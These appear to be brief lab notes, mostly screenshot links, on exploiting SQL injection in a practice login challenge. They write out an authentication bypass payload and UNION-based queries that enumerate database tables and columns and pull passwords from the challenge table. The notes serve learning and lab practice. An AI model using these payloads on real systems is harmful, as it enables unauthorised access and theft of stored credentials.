
If we supply a correct username

![](../Img/Pasted%20image%2020260326175801.png)

When we don't

![](../Img/Pasted%20image%2020260326175822.png)

Using a common payload `admin' or 1=1#`

![](../Img/Pasted%20image%2020260326175925.png)

## UNION

This payload works because the table from which we are pulling the data has 3 collumns (1 of those must be been hidden)

![](../Img/Pasted%20image%2020260326180750.png)

Since we know how many columns there are, we can change the last one and get other info

![](../Img/Pasted%20image%2020260326181014.png)

Next payload `jeremy' union select null,null,table_name from information_schema.tables#`

This works because we know what db it's running 

![](../Img/Pasted%20image%2020260326181142.png)

`jeremy' union select null,null,column_name from information_schema.columns#`

![](../Img/Pasted%20image%2020260326181259.png)

Now that we know the name of the table from this challenge we can try a new payload

`jeremy' union select null,null,password from injection0x01#`

![](../Img/Pasted%20image%2020260326181550.png)

